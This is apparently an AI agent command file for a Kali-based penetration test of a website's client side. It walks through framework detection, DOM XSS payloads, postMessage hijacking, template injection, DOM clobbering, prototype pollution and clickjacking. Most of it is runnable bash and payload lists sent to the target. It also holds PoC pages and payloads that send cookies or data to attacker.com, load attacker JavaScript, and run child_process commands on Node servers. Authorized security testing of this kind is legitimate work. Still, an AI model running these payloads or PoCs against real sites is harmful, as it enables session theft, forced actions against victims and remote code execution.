---
description: Client-side attack suite — DOM XSS (sources to sinks), postMessage hijacking, DOM clobbering, Client-Side Template Injection (Angular/Vue/React), clickjacking, prototype pollution via URL
argument-hint: <target-url>
allowed-tools: [mcp__kali-pentest__execute_kali_command, mcp__kali-desktop__browser_navigate, mcp__kali-desktop__browser_eval, mcp__kali-desktop__browser_get_network, mcp__kali-desktop__browser_screenshot]
---

# pt-client — Client-Side Attack Suite

You are a senior penetration tester targeting the browser/JavaScript attack surface. Most modern apps are SPAs (React, Angular, Vue). This entire attack surface is absent from traditional server-side scanning tools.

**Key insight**: DOM XSS is harder to find than reflected/stored XSS — automated scanners miss it, so bounties are higher. postMessage vulnerabilities are almost universally overlooked. CSTI in Angular/Vue leads to full JavaScript execution.

**Requires**: Desktop bridge (Playwright browser) for live DOM inspection. CLI tools for static JS analysis.

```bash
BASE_URL="$ARGUMENTS"
BASE_URL="${BASE_URL%/}"
ENG=/home/kali/current

echo "=== pt-client: Client-Side Attack Suite ==="
echo "Target: $BASE_URL"
echo ""
echo "Phases:"
echo "  1 — JavaScript framework detection"
echo "  2 — DOM XSS source/sink analysis"
echo "  3 — postMessage vulnerabilities"
echo "  4 — Client-Side Template Injection (CSTI)"
echo "  5 — DOM clobbering"
echo "  6 — Prototype pollution via URL"
echo "  7 — Clickjacking"
```

---

## Phase 1 — Framework Detection & JS Analysis

```bash
BASE_URL=<target_url>
ENG=/home/kali/current

echo "=== Phase 1: Framework Detection ==="

# Detect JavaScript framework from HTTP response
BODY=$(curl -sk "$BASE_URL" 2>/dev/null)
echo "$BODY" | grep -oiE "react|angular|vue|ember|backbone|knockout|svelte|next\.js|nuxt|gatsby" | sort -u | head -5
echo "$BODY" | grep -oiE "ng-app|ng-controller|v-app|data-reactroot|__vue__|__NEXT_DATA__|__nuxt__" | head -5

# Check response headers for framework hints
curl -sk -D - -o /dev/null "$BASE_URL" 2>/dev/null | grep -iE "x-powered-by:|x-generator:|x-framework:" | head -5

echo ""
echo "=== JS Bundle Analysis for DOM XSS Sinks ==="
JS_DIR="$ENG/recon/http/js"
if [ -d "$JS_DIR" ] && [ "$(ls "$JS_DIR"/*.js 2>/dev/null | wc -l)" -gt 0 ]; then
    echo "Scanning $(ls "$JS_DIR"/*.js 2>/dev/null | wc -l) JS files for dangerous sinks..."

    # High-risk sinks (direct XSS if user-controlled input reaches these)
    echo ""
    echo "--- innerHTML / outerHTML (XSS sinks) ---"
    grep -rn "\.innerHTML\s*=\|\.outerHTML\s*=\|\.insertAdjacentHTML" "$JS_DIR/" 2>/dev/null | \
        grep -v "//\|escap\|sanitiz\|encod\|DOMPurify" | head -15

    echo ""
    echo "--- eval() / Function() (code execution sinks) ---"
    grep -rn "eval(\|new Function(\|setTimeout(\|setInterval(" "$JS_DIR/" 2>/dev/null | \
        grep -v "//\|'use strict'" | head -10

    echo ""
    echo "--- document.write / document.writeln ---"
    grep -rn "document\.write\b" "$JS_DIR/" 2>/dev/null | head -10

    echo ""
    echo "--- Dangerous sources (input sources that feed into sinks) ---"
    grep -rn "location\.hash\|location\.search\|location\.href\|document\.referrer\|window\.name\|localStorage\|sessionStorage\|URLSearchParams" \
        "$JS_DIR/" 2>/dev/null | head -20

    echo ""
    echo "--- postMessage usage ---"
    grep -rn "addEventListener.*message\|window\.addEventListener.*message\|postMessage\|window\.opener\|window\.parent" \
        "$JS_DIR/" 2>/dev/null | head -15

    echo ""
    echo "--- Template literals with user input ---"
    grep -rn '`[^`]*\${[^}]*\(user\|input\|param\|query\|hash\|search\|location\)[^}]*}[^`]*`' \
        "$JS_DIR/" 2>/dev/null | head -10
else
    echo "No JS files found. Run /pt-recon Phase 3 first to download JS bundles."
    echo "Quick download:"
    curl -sk "$BASE_URL" 2>/dev/null | grep -oE 'src="[^"]+\.js[^"]*"' | \
        sed 's/src="//;s/"//' | while read js_url; do
            echo "  $BASE_URL$js_url"
            curl -sk "$BASE_URL$js_url" -o "$ENG/recon/http/js/$(basename $js_url | cut -d? -f1)" 2>/dev/null
        done
fi
```

---

## Phase 2 — DOM XSS Testing

**DOM XSS sources**: `location.hash`, `location.search`, `document.referrer`, `postMessage data`, `localStorage`, `window.name`

Use the Playwright browser tool for live DOM XSS testing — navigate to URLs with payloads and check if JS executes.

```bash
BASE_URL=<target_url>
ENG=/home/kali/current

echo "=== Phase 2: DOM XSS Source Testing ==="

# Test location.hash → innerHTML/document.write sinks
# Pattern: app reads window.location.hash and writes to DOM
XSS_PAYLOADS=(
    "#<img src=x onerror=alert(1)>"
    "#<script>alert(1)</script>"
    "#javascript:alert(1)"
    "#<svg onload=alert(1)>"
    "#\"><img src=x onerror=alert(1)>"
    "?q=<img src=x onerror=alert(1)>"
    "?search=<script>alert(1)</script>"
    "?name=<svg/onload=alert(1)>"
    "?redirect=javascript:alert(1)"
    "?next=javascript:alert(1)"
)

echo "Test these URLs in browser (check if alert fires or if XSS reflected in DOM):"
for payload in "${XSS_PAYLOADS[@]}"; do
    echo "  $BASE_URL/$payload"
done

echo ""
echo "=== DOM XSS via document.referrer ==="
echo "Test: load a page that reads document.referrer and writes to DOM"
echo "Exploit: link victim from attacker page containing XSS payload in URL"
# Check for referrer usage in JS
if [ -d "$ENG/recon/http/js" ]; then
    grep -rn "document\.referrer" "$ENG/recon/http/js/" 2>/dev/null | \
        grep -v "^\s*//" | head -10
fi

echo ""
echo "=== DOM XSS via window.name ==="
echo "Payload: set window.name = '<img src=x onerror=alert(1)>' then navigate to target"
echo "window.name persists across cross-origin navigations"
if [ -d "$ENG/recon/http/js" ]; then
    grep -rn "window\.name" "$ENG/recon/http/js/" 2>/dev/null | head -5
fi
```

**Playwright live testing** (run after identifying suspicious URL patterns):

Use `browser_navigate` to navigate to the URL with XSS payload in hash/param, then `browser_eval("document.body.innerHTML")` to check if payload appeared unescaped in DOM, and `browser_screenshot` to see if alert fired.

---

## Phase 3 — postMessage Vulnerabilities

**Why**: Apps use `postMessage` for cross-origin communication (iframes, OAuth popups, payment widgets). If the listener doesn't validate `event.origin`, any page can send malicious messages → XSS, data theft, CSRF.

```bash
BASE_URL=<target_url>
ENG=/home/kali/current

echo "=== Phase 3: postMessage Vulnerability Analysis ==="

if [ -d "$ENG/recon/http/js" ]; then
    echo "--- postMessage listener analysis ---"
    grep -rn -A 5 "addEventListener.*['\"]message['\"]" "$ENG/recon/http/js/" 2>/dev/null | \
        grep -v "^--$" | head -40

    echo ""
    echo "--- Origin check presence ---"
    echo "Listeners WITH origin check (likely safe):"
    grep -rn -A 3 "addEventListener.*message" "$ENG/recon/http/js/" 2>/dev/null | \
        grep -B 2 "event\.origin\|e\.origin\|message\.origin\|origin ==\|origin ===" | head -15

    echo ""
    echo "Listeners WITHOUT origin check (potentially vulnerable):"
    grep -rn -A 5 "addEventListener.*message" "$ENG/recon/http/js/" 2>/dev/null | \
        grep -v "origin\|trusted" | grep "innerHTML\|eval\|location\|postMessage\|data\." | head -10

    echo ""
    echo "--- postMessage sender analysis ---"
    grep -rn "\.postMessage(" "$ENG/recon/http/js/" 2>/dev/null | head -15

    echo ""
    echo "--- window.opener usage (tab napping) ---"
    grep -rn "window\.opener" "$ENG/recon/http/js/" 2>/dev/null | head -5
fi

echo ""
echo "=== postMessage exploit test ==="
echo "If listener found without origin check, create this PoC HTML file:"
cat << 'POCEOF'
<!-- poc_postmessage.html — host on attacker server, victim must open page -->
<!DOCTYPE html>
<html>
<body>
<script>
// Target: the window that listens for postMessage
// Open target in popup, then send malicious message
var target = window.open('<TARGET_URL>');
setTimeout(function() {
    // Payload 1: XSS via message data
    target.postMessage('<img src=x onerror=alert(document.domain)>', '*');
    // Payload 2: CSRF action trigger
    target.postMessage({action:'transfer',amount:1000,to:'attacker'}, '*');
    // Payload 3: Data exfiltration
    target.postMessage({type:'getData',key:'auth_token'}, '*');
}, 2000);

// Listen for response (if target sends data back)
window.addEventListener('message', function(e) {
    console.log('Received from target:', e.data);
    fetch('https://attacker.com/log?data=' + encodeURIComponent(JSON.stringify(e.data)));
});
</script>
</body>
</html>
POCEOF
```

---

## Phase 4 — Client-Side Template Injection (CSTI)

**Why**: Angular, Vue, React with dangerous patterns evaluate template expressions client-side. `{{7*7}}` becoming `49` in the DOM = arbitrary JavaScript execution (unlike server-side SSTI, CSTI runs in the victim's browser).

```bash
BASE_URL=<target_url>
ENG=/home/kali/current

echo "=== Phase 4: Client-Side Template Injection ==="

echo "--- Framework-specific CSTI detection payloads ---"
echo ""
echo "Test these in form fields, URL params, and any reflected inputs:"
echo ""
echo "Angular (AngularJS 1.x — most vulnerable):"
echo "  {{7*7}}                              → 49 = template executed"
echo "  {{constructor.constructor('alert(1)')()}}   → XSS"
echo "  {{'a'.constructor.prototype.charAt=[].join; \$eval('x=\"alert(1)\"');}}  → bypass"
echo "  {{[].pop.constructor('alert(1)')()}} → via array prototype"
echo ""
echo "Angular 2+ (less vulnerable, but sandbox escapes exist):"
echo "  {{constructor.constructor('alert(1)')()}}  → may work depending on version"
echo ""
echo "Vue.js:"
echo "  {{7*7}}                              → 49 = CSTI"
echo "  {{_c.constructor('alert(1)')()}}     → XSS"
echo "  {{constructor.constructor('alert(1)')()}} → via Object prototype"
echo ""
echo "React (JSX — rarely CSTI, but look for dangerouslySetInnerHTML):"
echo "  Search JS for: dangerouslySetInnerHTML"
if [ -d "$ENG/recon/http/js" ]; then
    grep -rn "dangerouslySetInnerHTML\|v-html\|ng-bind-html\|\[innerHTML\]" \
        "$ENG/recon/http/js/" 2>/dev/null | head -10
fi

echo ""
echo "=== CSTI Quick Test Commands ==="
for payload in "{{7*7}}" "{{7*'7'}}" "${{7*7}}" "<%=7*7%>" "#{7*7}" "*{7*7}"; do
    ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
    echo "  $BASE_URL/?q=$ENCODED"
    echo "  $BASE_URL/?search=$ENCODED"
    echo "  $BASE_URL/?name=$ENCODED"
done

echo ""
echo "AngularJS CSTI PoC (if 49 confirmed in DOM):"
echo "  {{constructor.constructor('fetch(\"https://attacker.com/?c=\"+document.cookie)')()}}"
```

---

## Phase 5 — DOM Clobbering

**Why**: If the app uses `document.getElementById('x')`, `window.x`, or named form elements without proper checks, an attacker can inject HTML that "clobbers" these expected values — overriding security checks, CSP nonces, or URL sources.

```bash
BASE_URL=<target_url>
ENG=/home/kali/current

echo "=== Phase 5: DOM Clobbering ==="

echo "--- Sink identification ---"
if [ -d "$ENG/recon/http/js" ]; then
    echo "Properties accessed via ID/name (potential clobbering targets):"
    grep -rn "document\.getElementById\|window\.\|document\.\b[a-zA-Z_]\+\b\s*\." \
        "$ENG/recon/http/js/" 2>/dev/null | grep -v "//\|log\|Error\|body\|head" | \
        grep -oE "document\.[a-zA-Z_]+\." | sort -u | head -20

    echo ""
    echo "Clobberable patterns:"
    grep -rn "\.src\b\|\.href\b\|\.innerHTML\b\|\.action\b" "$ENG/recon/http/js/" 2>/dev/null | \
        grep "document\.\|window\." | head -10
fi

echo ""
echo "=== DOM Clobbering test payloads ==="
echo ""
echo "Inject into HTML injection point (e.g. markdown, username, bio):"
echo ""
echo "1. Clobber window.x → redirect JS logic:"
echo "   <a id=x href='javascript:alert(1)'>x</a>"
echo "   Effect: window.x.href = 'javascript:alert(1)' → XSS if code does: location = x.href"
echo ""
echo "2. Clobber document.getElementById result:"
echo "   <form id=csrf_token><input name=value value='attacker_token'></form>"
echo "   Effect: document.getElementById('csrf_token').value = 'attacker_token'"
echo ""
echo "3. Clobber src for script loading:"
echo "   <a id=config href='https://attacker.com/evil.js'></a>"
echo "   Effect: if code does document.scripts.config.src → loads attacker JS"
echo ""
echo "4. Two-level clobbering (for deeper object access):"
echo "   <form id=x name=y><input id=z name=w value='payload'></form>"
echo "   Effect: x.y.z.w — window.x = form, x.y = nested form element"
```

---

## Phase 6 — Prototype Pollution via URL

**Why**: Many libraries (qs, jquery deparam, lodash) parse query strings with deep object support. `?__proto__[isAdmin]=true` may pollute `Object.prototype.isAdmin = true` → every `{}` in the app now has `isAdmin: true`.

```bash
BASE_URL=<target_url>

echo "=== Phase 6: Prototype Pollution via URL / Body ==="

PP_PAYLOADS=(
    "?__proto__[isAdmin]=true"
    "?__proto__[admin]=true"
    "?__proto__[role]=admin"
    "?constructor[prototype][isAdmin]=true"
    "?__proto__[status]=200"
    "?__proto__[outputFunctionName]=x;process.mainModule.require('child_process').exec('nslookup <oast_domain>')//"
)

echo "Test these URLs — check if: (1) app behavior changes, (2) admin UI appears, (3) OOB callback received"
for payload in "${PP_PAYLOADS[@]}"; do
    echo "  $BASE_URL/$payload"
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL/$payload" --max-time 5 2>/dev/null)
    echo "    → HTTP $CODE"
done

echo ""
echo "=== JSON body prototype pollution ==="
for payload in \
    '{"__proto__":{"isAdmin":true}}' \
    '{"__proto__":{"role":"admin"}}' \
    '{"constructor":{"prototype":{"isAdmin":true}}}' \
    '[{"__proto__":{"isAdmin":true}}]'; do
    RESP=$(curl -sk -X POST "$BASE_URL/api/settings" \
        -H "Content-Type: application/json" \
        -d "$payload" 2>/dev/null | head -3)
    echo "  $payload → $RESP"
done

echo ""
echo "=== Gadget chain test (server-side PP → RCE in Node.js) ==="
echo "If prototype pollution confirmed, test RCE gadgets:"
echo "  lodash.template gadget: __proto__[sourceURL]=x;require('child_process').exec('...')//"
echo "  Pug/Jade gadget: __proto__[block][callee]=process.mainModule.require('child_process').exec"
echo "  Reference: https://github.com/BlackFan/client-side-prototype-pollution"
```

---

## Phase 7 — Clickjacking

**Why**: If a page can be framed (no X-Frame-Options, no frame-ancestors CSP), attacker overlays a fake UI over the target. Victim clicks attacker UI → actually clicking target page buttons (account deletion, fund transfer, settings change).

```bash
BASE_URL=<target_url>

echo "=== Phase 7: Clickjacking ==="

echo "--- X-Frame-Options header check ---"
HEADERS=$(curl -sk -D - -o /dev/null "$BASE_URL" 2>/dev/null)
echo "$HEADERS" | grep -i "x-frame-options:\|content-security-policy:" | head -3

XFO=$(echo "$HEADERS" | grep -i "x-frame-options:" | head -1)
CSP_FRAME=$(echo "$HEADERS" | grep -i "content-security-policy:" | grep -i "frame-ancestors" | head -1)

if [ -z "$XFO" ] && [ -z "$CSP_FRAME" ]; then
    echo "  [CLICKJACKING LIKELY] No X-Frame-Options AND no CSP frame-ancestors"
elif echo "$XFO" | grep -qi "SAMEORIGIN\|DENY"; then
    echo "  [PROTECTED] X-Frame-Options: $XFO"
elif echo "$CSP_FRAME" | grep -qi "frame-ancestors 'none'\|frame-ancestors 'self'"; then
    echo "  [PROTECTED] CSP frame-ancestors present"
fi

echo ""
echo "--- Test sensitive pages for framing ---"
for path in / /account /settings /admin /transfer /delete-account /payment /profile /change-email /change-password; do
    CODE=$(curl -sk -D - -o /dev/null "$BASE_URL$path" 2>/dev/null)
    XFO=$(echo "$CODE" | grep -i "x-frame-options:" | head -1)
    CSP=$(echo "$CODE" | grep -i "content-security-policy:" | grep -i "frame-ancestors" | head -1)
    if [ -z "$XFO" ] && [ -z "$CSP" ]; then
        HTTP=$(echo "$CODE" | head -1 | grep -oE "[0-9]{3}")
        [ "$HTTP" = "200" ] && echo "  [FRAMEABLE] $BASE_URL$path"
    fi
done

echo ""
echo "=== Clickjacking PoC ==="
cat << 'POCEOF'
<!-- clickjacking_poc.html — demonstrates the attack -->
<!DOCTYPE html>
<html>
<head><style>
  .attacker { position: absolute; top: 0; left: 0; z-index: 2; opacity: 0; }
  .decoy { position: absolute; top: 0; left: 0; z-index: 1; }
  iframe { width: 800px; height: 600px; }
</style></head>
<body>
  <!-- Target page framed invisibly -->
  <iframe class="attacker" src="<TARGET_URL>/account/delete"></iframe>
  <!-- Fake UI victim sees -->
  <div class="decoy">
    <h1>Win a Prize! Click the button below!</h1>
    <button style="position:absolute; top:XXpx; left:XXpx">CLAIM NOW</button>
  </div>
</body>
</html>
POCEOF
echo "(Adjust top/left coordinates to align fake button with actual page button)"
```

---

## Phase 8 — Save Results

```bash
ENG=/home/kali/current

echo "=== pt-client: Summary ==="
echo ""
echo "Key findings to document:"
echo "  DOM XSS: note the source (location.hash/referrer/postMessage) and sink (innerHTML/eval)"
echo "  postMessage: note missing origin check + what data is processed"
echo "  CSTI: note framework + confirm with 7*7=49 before escalating to JS exec payload"
echo "  Clickjacking: note which sensitive actions are frameable"
echo ""
echo "Save PoC:"
echo "  cp /tmp/poc_*.html $ENG/poc/requests/"
echo ""
echo "Document finding:"
cat << 'EOF'
## Finding: DOM XSS via location.hash
**Severity**: High
**CVSS**: 6.1 | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (reflected)
         8.8 | AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N (if stored/persisted)
**Endpoint**: https://target.com/page#<payload>
**Source**: location.hash
**Sink**: innerHTML
**Impact**: Execute arbitrary JavaScript in victim's browser — steal session, exfiltrate data, perform actions as victim
**Fix**: Never write location.hash directly to innerHTML. Use textContent, or sanitize with DOMPurify.
EOF
```

---

## CVSS Reference

| Finding | CVSS | Notes |
|---------|------|-------|
| DOM XSS (reflected via hash) | 6.1 | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |
| DOM XSS (stored/persisted) | 8.8 | AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N |
| postMessage no origin (XSS) | 7.1 | AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:L/A:N |
| CSTI Angular → JS exec | 6.1 | Same as reflected XSS |
| Clickjacking (sensitive action) | 6.5 | AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N |
| Prototype pollution → RCE | 9.0 | AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H |
| DOM clobbering → XSS | 5.4 | AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N |

---

## Expert Notes

**DOM XSS requires source-to-sink tracing**: Don't just grep for `innerHTML`. Trace the data flow: what user-controlled input (hash, query param, referrer) eventually reaches a dangerous sink. Modern minified JS makes this hard — deobfuscate source maps first, or use browser DevTools to set breakpoints on `innerHTML` assignments.

**postMessage is the most overlooked**: Developers know about XSS but forget that `window.addEventListener('message', ...)` is a security boundary. If it processes data without checking `event.origin === 'https://legit.com'`, any page can send commands to it. Look for OAuth popup flows, payment iframes, and live chat widgets — they almost always use postMessage.

**AngularJS 1.x CSTI is reliable**: If the app uses AngularJS (check for `ng-app` attribute, `angular.js` in scripts), CSTI is almost guaranteed if any user input is reflected inside `{{ }}` context. The sandbox was officially removed in 1.6.0. `{{constructor.constructor('alert(1)')()}}` is the standard PoC.

**Clickjacking impact depends on framed action**: Framing a marketing page = Low. Framing a "delete account" or "transfer funds" button = High. Always escalate to the most sensitive action available on a frameable page.
